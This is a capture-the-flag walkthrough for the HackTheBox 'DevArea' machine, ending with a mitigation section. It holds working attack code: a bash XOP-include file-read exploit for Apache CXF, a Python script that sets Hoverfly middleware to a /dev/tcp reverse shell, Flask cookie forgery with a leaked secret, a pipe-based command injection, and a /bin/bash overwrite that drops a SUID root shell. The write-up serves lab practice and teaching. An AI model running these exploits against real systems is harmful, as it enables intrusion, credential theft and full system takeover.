<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
  <img src="https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux" alt="OS Linux" />
  <img src="https://img.shields.io/badge/Difficulty-Hard-yellow?style=for-the-badge" alt="Hard Difficulty" />
</p>

# Dev Area Notes

## Step 1 - Reconnaissance

```bash
nmap -A -sS -P -T4  --min-rate 5000 10.129.14.43
```

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-29 13:52 UTC
Stats: 0:01:46 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 100.00% done; ETC: 13:53 (0:00:00 remaining)
Nmap scan report for 10.129.14.43
Host is up (0.25s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Sep 22  2025 pub
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.15.183
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 83:13:6b:a1:9b:28:fd:bd:5d:2b:ee:03:be:9c:8d:82 (ECDSA)
|_  256 0a:86:fa:65:d1:20:b4:3a:57:13:d1:1a:c2:de:52:78 (ED25519)
80/tcp   open  http    Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://devarea.htb/
|_http-server-header: Apache/2.4.58 (Ubuntu)
8080/tcp open  http    Jetty 9.4.27.v20200227
|_http-server-header: Jetty(9.4.27.v20200227)
|_http-title: Error 404 Not Found
8500/tcp open  fmtp?
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 500 Internal Server Error
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Sun, 29 Mar 2026 13:52:40 GMT
|     Content-Length: 64
|     This is a proxy server. Does not respond to non-proxy requests.
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 500 Internal Server Error
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Sun, 29 Mar 2026 13:52:08 GMT
|     Content-Length: 64
|     This is a proxy server. Does not respond to non-proxy requests.
|   HTTPOptions:
|     HTTP/1.0 500 Internal Server Error
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Sun, 29 Mar 2026 13:52:09 GMT
|     Content-Length: 64
|_    This is a proxy server. Does not respond to non-proxy requests.
8888/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Hoverfly Dashboard
```

> — Well Well , FTP with anonymous login enabled Interesting!
> — Lets Take a look at the FTP

```bash
ftp devarea.htb
```

```text
Connected to devarea.htb.
220 (vsFTPd 3.0.5)
Name (devarea.htb:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||41410|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Sep 22  2025 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||46068|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp       6445030 Sep 22  2025 employee-service.jar
226 Directory send OK.
ftp> get employee-service.jar
local: employee-service.jar remote: employee-service.jar
229 Entering Extended Passive Mode (|||48727|)
150 Opening BINARY mode data connection for employee-service.jar (6445030 bytes).
100% |*******|  6293 KiB  233.25 KiB/s    00:00 ETA
226 Transfer complete.
6445030 bytes received in 00:27 (231.07 KiB/s)
ftp> quit
221 Goodbye.
```

> — Got an employee-service.jar file
> — Lets now unzip the content

```bash
unzip employe* -d target_directory/
```

```text
ls
about.html  htb    jetty-dir.css  mozilla  OSGI-INF
com         javax  META-INF       org      schemas
```

> — There are bunch of files. but our main, target is this htb folder

```bash
cd htb/devarea
ls
```

```text
EmployeeService.class      Report.class
EmployeeServiceImpl.class  ServerStarter.class
```

> — So there are these employeeservice java files, that need to be complied in order to see the content

```bash
javap -c -p EmployeeServiceImpl.class
```

```text
Compiled from "EmployeeServiceImpl.java"
public class htb.devarea.EmployeeServiceImpl implements htb.devarea.EmployeeService {
  public htb.devarea.EmployeeServiceImpl();
...
```

```bash
javap -c -p EmployeeService.class
```

```text
Compiled from "EmployeeService.java"
public interface htb.devarea.EmployeeService {
  public abstract java.lang.String submitReport(htb.devarea.Report);
}
```

```bash
javap -c -p Report.class
```

```text
Compiled from "Report.java"
public class htb.devarea.Report {
  private java.lang.String employeeName;
  private java.lang.String department;
  private java.lang.String content;
  private boolean confidential;
...
```

```bash
javap -c -p ServerStarter.class
```

```text
Compiled from "ServerStarter.java"
public class htb.devarea.ServerStarter {
  public htb.devarea.ServerStarter();
    Code:
...
      26: ldc           #9                  // String http://0.0.0.0:8080/employeeservice
...
      39: ldc           #13                 // String Employee Service running at http://localhost:8080/employeeservice
...
}
```

* Breakdown --->
  * `EmployeeService.class`: The Interface. It defines the "contract" (the names of the methods) but contains no actual code logic.
  * `EmployeeServiceImpl.class`: The Logic. This is the most important file; it contains the `submitReport` method that processes your input and returns the string. (possibly XXE)
  * `Report.class`: The Data Model. This defines what a "Report" object looks like (fields for employeeName, department, content, and the isConfidential flag).
  * `ServerStarter.class`: The Entry Point. This starts the web server, sets the port (8080), and maps the `EmployeeService` to the `/employeeservice` URL you found in the WSDL.

> — Now this makes sense! the port 8080 jetty wasn't just nothing, it was meant to view these XML files!
> — Lets view these wsdl content

* the application is running a SOAP (Simple Object Access Protocol) web service. In SOAP, the WSDL (Web Services Description Language) file is a public XML document that describes how to interact with the service—listing available methods, expected parameters, and data formats.

> — in short the wsdl file can be a blueprint, which ultimately tells us what type of XML, does this server accepts (will use it in XXE)
> — lets look at the wsdl file

```xml
<wsdl:definitions name="EmployeeServiceService" targetNamespace="http://devarea.htb/">
wsdl:types
...
```

* Connection with XXE
  * The connection to XXE (XML External Entity Injection) is critical because SOAP services communicate exclusively using XML.
  * Implicit Attack Surface: Since a SOAP service is built to parse XML by design, it is a prime target for XXE. If the underlying XML parser is "weakly configured" (i.e., it allows external entities), an attacker can inject a malicious payload into the SOAP request body.
  * Exploitation via Parameters: You can replace a normal parameter in a SOAP request (like a username or report content) with an XML entity that points to a sensitive file on the server (e.g., /etc/passwd).
  * WSDL as a Map: The WSDL you found is your map for the attack. It tells you exactly which XML tags (parameters) the server is expecting, so you know where to inject your XXE payload to ensure it gets processed by the server's logic.

## Step 2 - Initial Foothold

> — Now we have everything, now lets create the XML with the acceptable structure, to read the /etc/passwd

```http
POST /employeeservice HTTP/1.1
Host: devarea.htb:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Content-Type: text/xml
Content-Length: 535
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org" xmlns:dev="http://devarea.htb">
   soapenv:Header/
   soapenv:Body
      dev:submitReport
         <arg0>
            <employeeName>Admin</employeeName>
            <department>IT</department>
            <content>&xxe;</content>
         </arg0>
      </dev:submitReport>
   </soapenv:Body>
</soapenv:Envelope>
```

> — Send this via burpsuite

```http
HTTP/1.1 500 Server Error
Connection: close
Date: Sun, 29 Mar 2026 15:17:48 GMT
Content-Type: text/xml;charset=iso-8859-1
Content-Length: 325
Server: Jetty(9.4.27.v20200227)

<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">soap:Bodysoap:Fault<faultcode>soap:Client</faultcode><faultstring>Error reading XMLStreamReader: Received event DTD, instead of START_ELEMENT or END_ELEMENT.
 at [row,col {unknown-source}]: [2,14]</faultstring></soap:Fault></soap:Body></soap:Envelope>
```

> — Okay so we got an error!!

* The error "Received event DTD, instead of START_ELEMENT" means the XML parser on this server (Jetty/CXF) has DTD processing disabled. It sees your `<!DOCTYPE` block and immediately throws a 500 error because it wasn't expecting a Document Type Definition.
* 1. Why simple XXE failed
  * The error you received earlier ("Received event DTD, instead of START_ELEMENT") explains exactly why the first attempt failed.
  * The Guardrail: Modern XML parsers (like the one in your Jetty/CXF server) are often configured with a security setting that completely disables DTD (Document Type Definition) processing.
  * The Result: When you sent `<!DOCTYPE ...>`, the parser saw it as a violation of its security policy and killed the request before even looking at your payload. It didn't "block" the file read; it blocked the syntax used to define the entity.
* 1. Why this worked (CVE-2022-46364)
  * The script exploits a specific flaw in Apache CXF (the framework running your SOAP service).
  * The "Double Fetch": When the server receives an `xop:Include` tag, the CXF framework automatically resolves the href. It fetches the file (/etc/passwd) before the Java code even sees it.
  * Automatic Base64: Because `/etc/passwd` contains characters that could break XML (like : or newlines), Apache CXF automatically Base64 encodes the file content to keep the XML "legal."
  * The "Mirror" Effect: Your `EmployeeServiceImpl.class` logic takes the employeeName and returns it in the response: "Report received from [EmployeeName]". Since the framework replaced your tag with the Base64-encoded file, the server literally hands you the encoded file in its "Hello" message.

> — have created a bash script that will get the etc/passwd info

```bash
#!/bin/bash

# ===========================
# CVE-2022-46364 - Apache CXF XOP Include LFI
# Usage: bash lfi.sh file:///etc/passwd
# ===========================

# TODO: set your target URL here
TARGET="http://devarea.htb:8080/employeeservice"

if [ -z "$1" ]; then
    echo "Usage: $0 <file_path>"
    echo "Ex:    $0 file:///etc/passwd"
    echo "       $0 file:///home/dev_ryan/user.txt"
    exit 1
fi

FILE="$1"

RESPONSE=$(curl -s -X POST "$TARGET" \
  -H 'Content-Type: multipart/related; type="application/xop+xml"; start="root.message@cxf.apache.org"; start-info="text/xml"; boundary="----=_Part_1"' \
  -d $'------=_Part_1\r\nContent-Type: application/xop+xml; charset=UTF-8; type="text/xml"\r\nContent-Transfer-Encoding: 8bit\r\nContent-ID: root.message@cxf.apache.org\r\n\r\n<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:dev="http://devarea.htb/">\r\n   soapenv:Header/\r\n   soapenv:Body\r\n      dev:submitReport\r\n         <arg0>\r\n            <employeeName><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="'"$FILE"'"/></employeeName>\r\n            <department>IT</department>\r\n            <content>test</content>\r\n            <confidential>false</confidential>\r\n         </arg0>\r\n      </dev:submitReport>\r\n   </soapenv:Body>\r\n</soapenv:Envelope>\r\n------=_Part_1--')

# Try to extract base64 from the employeeName field
B64=$(echo "$RESPONSE" | grep -oP 'from \K[^.]+')

if [ -z "$B64" ]; then
    # Fallback: extract directly from XML tag
    B64=$(echo "$RESPONSE" | grep -oP '(?<=<employeeName>)[^<]+')
fi

if [ -z "$B64" ]; then
    echo "[!] No content found in response (permission denied or file does not exist)."
    echo "[*] Raw response:"
    echo "$RESPONSE"
    exit 1
fi

echo "[+] File: $FILE"
echo "[+] Content:"
echo "$B64" | base64 -d 2>/dev/null || echo "$B64"
```

> — Lets execute it

```bash
./exploit.sh file:///etc/passwd
```

```text
[+] File: file:///etc/passwd
[+] Content:
root:x:0:0:root:/root:/bin/bash
...
dev_ryan:x:1001:1001::/home/dev_ryan:/bin/bash
...
```

> — we have a user dev_ryan!
> — Now as we know that there is this hoverfly running on port 8888, its a dashboard, which needs login creds, and now that we can read the file system, there might be a way in to read the configuration file for this, it might be running somewhere in the background! as some service file.

* hoverfly.service: In a Linux environment, a .service file located in /etc/systemd/system/ is a Unit file used by systemd to manage background services (daemons)
  * What does this file contain? This specific file defines how the Hoverfly process is started, stopped, and configured on the server. Because you are hunting for credentials or entry points, this is a "gold mine" for three things:
  * `ExecStart=`: The exact command used to launch Hoverfly. This often contains hardcoded passwords or API keys passed as flags (e.g., -username admin -password secret)
  * `User=` and `Group=`: Tells you which user account is running the service (e.g., dev_ryan). If you compromise Hoverfly, you inherit this user's permissions
  * `Environment=`: Often contains sensitive environment variables like HOVERFLY_AUTH_TOKEN or database connection strings

> — Lets use the above bash script to read the content.

```bash
./exploit.sh  file:///etc/systemd/system/hoverfly.service
```

```text
[+] File: file:///etc/systemd/system/hoverfly.service
[+] Content:
[Unit]
Description=HoverFly service
After=network.target

[Service]
User=dev_ryan
Group=dev_ryan
WorkingDirectory=/opt/HoverFly
ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0
...
```

> — Just like said above, it gave us the exact credentials for entry, now lets use these creds in the web dashboard at 8888
> — Logged in, and got a very interesting thing, the version
> — Version	v1.11.3

> — While Searching for known vulnerabilities in this version

* Hoverfly version 1.11.3 and prior are affected by a critical Remote Code Execution (RCE) vulnerability, identified as CVE-2025-54123.
* Vulnerability Details:-
  * The flaw exists in the middleware management API endpoint, specifically at `/api/v2/hoverfly/middleware`.
  * Cause: Insufficient validation and sanitization of user input in the binary and script parameters.
  * Impact: An unauthenticated attacker can inject malicious payloads or execute arbitrary system commands (such as reverse shells) on the host server. These commands run with the same privileges as the Hoverfly process.
  * Technical Flaws: The issue stems from a combination of insufficient input validation, unsafe command execution, and immediate execution during testing within the service's code.

> — We got a RCE!!
> — now i have tried it with some attempts but getting some failures, then i understood the flow with AI

* Why previous attempts failed
  * DTD/XXE Blocked: Your first attempt failed because the XML parser (Jetty/CXF) had a security filter that killed any request containing a `<!DOCTYPE>` tag.
  * The "Unexpected Wrapper" (Namespace): Your manual attempts often triggered 500 errors because of a missing trailing slash (/) in the namespace or missing fields in the Report object. Java/SOAP is extremely "picky"—if the XML doesn't match the .class file perfectly, it crashes.
  * No Trigger: Even when you successfully updated the middleware manually, nothing happened. This is because Hoverfly only runs middleware when it processes a request. If nobody is using the proxy, your "attack" just sits in memory doing nothing.

> — I later on get to know that it runs 2 ports
> — 8888 (Admin Control): This is where you change settings and upload scripts.
> — 8500 (The Proxy): This is where the actual data flows.
> — By sending a request to port 8500, we forced the server to process data, which triggered the "Middleware" we uploaded to port 8888.
> — So it means to trigger the middleware we need to use the proxy.
> — lets make an automated python script for this whole attack

```python
import requests
import sys
import json
import subprocess
import time

# --- CONFIGURATION ---
BASE_URL = "http://devarea.htb:8888"
PROXY_URL = "http://devarea.htb:8500"
USER = "admin"
PASS = "O7IJ27MyyXiU"

def get_token():
    print("[*] Requesting Bearer Token...")
    url = f"{BASE_URL}/api/token-auth"
    data = {"username": USER, "password": PASS}
    try:
        r = requests.post(url, json=data)
        token = r.json().get("token")
        if token:
            print(f"[+] Token obtained: {token[:15]}...")
            return token
    except Exception as e:
        print(f"[-] Failed to get token: {e}")
    return None

def set_middleware(token, script):
    url = f"{BASE_URL}/api/v2/hoverfly/middleware"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    payload = {
        "binary": "/bin/bash",
        "script": script
    }
    r = requests.put(url, headers=headers, json=payload)
    return r.status_code, r.text

def trigger_proxy():
    print("[*] Triggering middleware via Proxy...")
    proxies = {
        "http": f"http://{USER}:{PASS}@devarea.htb:8500",
    }
    try:
        # We use a background-like trigger by setting a short timeout
        requests.get("http://devarea.htb/", proxies=proxies, timeout=2)
    except requests.exceptions.RequestException:
        # Timeout is expected if the shell hangs the process
        pass

def main():
    token = get_token()
    if not token: sys.exit(1)

    # 1. TEST PHASE (whoami)
    print("[*] Testing RCE with 'whoami'...")
    # Using a simple script that creates a file in /tmp to verify execution
    status, res = set_middleware(token, "whoami > /tmp/pwned")
    if status == 200:
        trigger_proxy()
        print("[+] 'whoami' command sent. If the API returned 200, we are ready.")
    else:
        print(f"[-] Middleware setup failed: {res}")
        sys.exit(1)

    # 2. REVERSE SHELL PHASE
    print("\n" + "="*40)
    print("STEP: SETUP YOUR LISTENER (nc -lvnp 4444)")
    print("="*40)
    lhost = input("Enter your HTB VPN IP: ")
    lport = input("Enter Port [4444]: ") or "4444"

    rev_shell_script = f"#!/bin/bash\nbash -i >& /dev/tcp/{lhost}/{lport} 0>&1"

    print(f"[*] Setting Reverse Shell for {lhost}:{lport}...")
    status, res = set_middleware(token, rev_shell_script)

    if status == 200:
        print("[+] Middleware updated. Triggering shell now...")
        trigger_proxy()
        print(f"[+] Done. Check your listener at {lhost}:{lport}!")
    else:
        print(f"[-] Failed to set shell: {res}")

if __name__ == "__main__":
    main()
```

* Explanation -
  * The Logic of the Script
  * The Python script automates the four critical stages of the attack:
  * Authentication (The Token): It hits `/api/token-auth`. This is the modern way APIs handle logins. Instead of sending your password every time, you exchange it once for a JWT (JSON Web Token). The script grabs this token so it can "prove" it's admin for the next steps.
  * Weaponization (The Middleware): Hoverfly has a feature called Middleware. It’s meant for developers to "tweak" API responses using scripts. We abused this by telling Hoverfly: "Hey, use `/bin/bash` as your tool and run my reverse shell as the script."
  * Execution (The Proxy Trigger): This was the missing link. The script uses the requests proxy settings to send a fake request through the Hoverfly service (Port 8500).
    * Hoverfly sees a request coming in.
    * It says, "Wait, I have middleware I need to run first!"
    * It executes `/bin/bash` with your shell payload.
  * The Shell: Since Hoverfly is running as a service, the shell it "pops" inherits the permissions of the user running it (likely `dev_ryan`).

> — On listener!

```bash
nc -lvnp 4444
```

```text
listening on [any] 4444 ...
connect to [10.10.15.183] from (UNKNOWN) [10.129.14.43] 37638
bash: cannot set terminal process group (1423): Inappropriate ioctl for device
bash: no job control in this shell
dev_ryan@devarea:/opt/HoverFly$ cat /home/ryan_dev/user.txt
...
dev_ryan@devarea:~$ ls
syswatch-v1.zip
user.txt
```

## Step 3 - Privilege Escalation

> — So lets see what this user got for us.

```bash
sudo -l
```

```text
Matching Defaults entries for dev_ryan on devarea:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User dev_ryan may run the following commands on devarea:
    (root) NOPASSWD: /opt/syswatch/syswatch.sh, !/opt/syswatch/syswatch.sh
        web-stop, !/opt/syswatch/syswatch.sh web-restart
```

> — No access to the directory

```bash
sudo /opt/syswatch/syswatch.sh --help
```

```text
SysWatch 1.0.0
Usage: /opt/syswatch/syswatch.sh <command> [args]
Commands:
  web                 Start web GUI
  web-stop            Stop web GUI
...
```

```bash
sudo /opt/syswatch/syswatch.sh web-status
```

```text
● syswatch-web.service - SysWatch Web GUI
     Loaded: loaded (/etc/systemd/system/syswatch-web.service; enabled; preset: enabled)
     Active: active (running) since Mon 2026-03-30 14:06:38 UTC; 23h ago
...
```

> — Some sort of web service. but running where?

```bash
ss -tnlp
```

```text
State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess
LISTEN 0      128        127.0.0.1:7777      0.0.0.0:*    # Custom Probably for syswacth
```

> — Lets tunnel up!
> — Chisel can be used to tunnel up here.
> — once done, go to browser ---> `http://127.0.0.1:7777/login`
> — it turns out to be a login page, and no found credentials worked
> — while looking at some confs and other files in etc

```bash
cat syswatch.env
```

```text
SYSWATCH_SECRET_KEY=f3ac48a6006a13a37ab8da0ab0f2a3200d8b3640431efe440788beaefa236725
SYSWATCH_ADMIN_PASSWORD=SyswatchAdmin2026
...
```

> — okay we got a password and a secret key**!**
> — tried to login with the password and username admin, and didn't worked
> — now here is another way, we can forge a session id with this secret key for user admin!
> — Will be using flask to forge the session id

* What is Flask?
  * Flask is a lightweight Python web framework. It handles routing, requests, and user sessions.

> — Flask is nothing but a python framework which can let us decode and forge cookies based on the structure provided.

* Install it with --> `pip3 install flask-unsign`

> — First we need to get a sample cookie from that web, in order to forge a new session with allowed structure.
> — Once you got the session id from the web, just decode it

```bash
flask-unsign --decode \
--cookie 'eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.acqVqw.rZ8yUEf9Da2nsafgfRjz4c5lJNQ'

# Output:
# {'user_id': 1, 'username': 'admin'}  # This is the cookie structure
```

> — Now lets forge the cookie/session id

```bash
flask-unsign --sign \
--cookie "{'user_id': 1, 'username': 'admin'}" \
--secret 'f3ac48a6006a13a37ab8da0ab0f2a3200d8b3640431efe440788beaefa236725'
```

```text
eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.ac585A.M2WV3-hqkXFz4M9v5W5INXyqya8
```

> — We got the cookie for admin, just paste it in browser and we are in!
> — While looking at the service, it seems like bunch of logs are there, and details about service.
> — When i captured the POST request for this 'service-status' endpoint which basically has an input field, that lets us know the status of services (e.g.:-ssh, ftp, etc )

```http
POST /service-status HTTP/1.1
Host: 127.0.0.1:7777
Cookie: session=eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.ac585A.M2WV3-hqkXFz4M9v5W5INXyqya8
...

service=ssh
```

> — This service parameter looks kinda fishy, because, if we look closely the backend might be running systemctl status {input}
> — Lets try to use pipe operator to execute any system command.

```http
POST /service-status HTTP/1.1
...
service=ssh|whoami
```

> — It worked, i got 'Syswatch' in the output.

* Pipe's significance

```text
systemctl status ssh | whoami

Here `id` **doesn't read stdin at all**. It just runs and prints user info regardless. So the pipe here is being abused purely as a **command chaining operator**.

systemctl status ssh    →    outputs service status text
         |              →    pipe created (but id ignores it)
      whoami            →    runs independently, prints current user
```

> — The pipe was created and ignored or we can say bypassed. and the id command ran independently.
> — We got everything we needed, Remote code execution directly on the server!
> — Tried using reverse shell payload, didn't worked, with single as well as double URL encode, the server side firewall might have something that is blocking it, which i just don't know!
> — It runs systemctl status {service_name_from_input} and whenever i try to use some built utilities like cat, head, more etc to read the content it just gives me an error of "Invalid service name", while when i run only the commands name like systemctl status cat it gives me the details of cat flags and usage! which is strange.
> — Means we almost have this vulnerability of RCE but we just unable to get success. fuckking hell! HTB sometimes sucks.
> — Lets try something else.
> — While enumerating i found one critical thing

```bash
ls -la /bin/bash
```

```text
-rwxrwxrwx 1 root root 1446024 Mar 31  2024 /bin/bash
```

> — Fucking bin bash is writeable!

```text
-rwxrwxrwx
 ↑↑↑↑↑↑↑↑↑
 |||||||||
 ||||||└└└─ others:  r=read w=write x=execute  ← EVERYONE
 |||└└└──── group:   r=read w=write x=execute
 └└└─────── owner:   r=read w=write x=execute
```

* Why is This Catastrophic?
  * `/bin/bash` is the most executed binary on the system. Everything uses it:
  * cron jobs        → `#!/bin/bash`
  * sudo commands    → calls bash internally
  * shell scripts    → `#!/bin/bash`
  * system services  → use bash for execution
  * **If you control what `/bin/bash` does, you control everything that runs bash.**

> — In our case, we can run syswatch.sh as root. as we saw above (root) NOPASSWD: /opt/syswatch/syswatch.sh
> — Means that the script starts with !/bin/bash which i can control!
> — attack chain -->

```text
sudo syswatch.sh          ← runs as ROOT
      ↓
calls /bin/bash           ← which YOU control
      ↓
your evil bash runs       ← as ROOT #will copy our evil_bash into the main bin/bash
      ↓
profit
```

> — We are about to copy the real bash with our fake bash, so we first need to take the backup of the real bash, in order to work further.

```bash
cp /bin/bash /tmp/bash.bak
```

> — Now we have to create a fake bash to be replaced with the real bash!

```bash
cat << 'EOF' > evil_bash
#!/tmp/bash.bak       			← Line 1: shebang — use REAL bash to run this script
cp /tmp/bash.bak /tmp/rootbash		← Line 2: copy real bash to /tmp/rootbash
chmod 4755 /tmp/rootbash   		← Line 3: set SUID bit on rootbash (EVIL ACTION)
exec /tmp/bash.bak $@			← Line 4: behave normally, pass all args through
EOF
```

> — once done, now lets replace it with our /bin/bash

```bash
cp /tmp/evil_bash /bin/bash
```

```text
cp: cannot create regular file '/bin/bash': Text file busy
```

> — Okay so we got this error. i have searched about this error. 

* Its called the ETXTBSY problem :- Linux kernel prevents overwriting a binary that is currently being executed:
  * Process 1: `/bin/bash` (your current shell)     ← kernel locks it
  * Process 2: `cp evil_bash /bin/bash`             ← BLOCKED

> — Look at the above output, i was getting some errors regrading to the permissions i really don't know why?
> — so i came up with one solution 
> — I tried to change the command interpreter to dash (Debian Almquist shell.), and then i killed the bash, so no concurrent processes take place. 

```bash
dash
killall -9 bash
dd if=/tmp/evil_bash of=/bin/bash
sudo /opt/syswatch/syswatch.sh --version
/tmp/rootbash -p
```

```text
0+1 records in
0+1 records out
94 bytes copied, 0.00033013 s, 285 kB/s

1.0.0

# whoami
root
```

> — Done!

## Mitigation & Security Perspective

> [!CAUTION]
> **CVE-2022-46364 - Apache CXF XOP Include Arbitrary File Read (XXE)**
> The Java SOAP service running on Apache CXF is vulnerable to an `xop:Include` XML injection attack. By supplying a maliciously crafted `href` attribute, an attacker can coerce the service into reading arbitrary local files (e.g., `/etc/passwd`) and returning their Base64-encoded contents.
> **Mitigation:** Update Apache CXF to a version immune to CVE-2022-46364. Configure the XML parser used by the framework to explicitly disable external entities and strictly enforce `XMLConstants.FEATURE_SECURE_PROCESSING`. Ensure MTOM/XOP attachments are validated before processing.

> [!CAUTION]
> **CVE-2025-54123 - Hoverfly Authenticated RCE**
> Hoverfly v1.11.3 middleware API lacks sufficient input sanitization, allowing an authenticated attacker to execute arbitrary OS commands via the `script` and `binary` fields.
> **Mitigation:** Patch Hoverfly to the latest secure version. Follow the principle of least privilege: the Hoverfly process should run under an isolated, highly restricted user account (e.g., via a dedicated Docker container) rather than an interactive user like `dev_ryan`. Use strong, randomly generated administrative passwords, and do not store them in plaintext systemd service files.

> [!WARNING]
> **Flask Session Forgery & Weak Secret Keys**
> The Syswatch web application stores its Flask `SYSWATCH_SECRET_KEY` in plaintext within `/etc/syswatch.env`. An attacker with read access can trivially sign and forge session cookies (e.g., `user_id=1`, `username='admin'`) via tools like `flask-unsign`.
> **Mitigation:** Never store cryptographic secrets in world-readable files. Secure the `.env` file with restrictive permissions (e.g., `600`) owned solely by the application user. Periodically rotate secret keys to invalidate older, potentially compromised sessions.

> [!CAUTION]
> **World-Writable System Binaries & ETXTBSY Bypass**
> The `/bin/bash` executable was inexplicably configured with `777` permissions (`-rwxrwxrwx`), allowing any user to overwrite the primary system shell.
> **Mitigation:** Ensure all critical system binaries in `/bin`, `/sbin`, `/usr/bin`, and `/usr/sbin` are strictly owned by `root:root` with permissions set to `755` (`-rwxr-xr-x`). Run periodic file integrity monitoring (e.g., AIDE, Tripwire) to detect unauthorized changes to core executables and permissions. Never permit users to execute scripts via `sudo NOPASSWD` if those scripts rely on binaries that can be modified by unprivileged users.
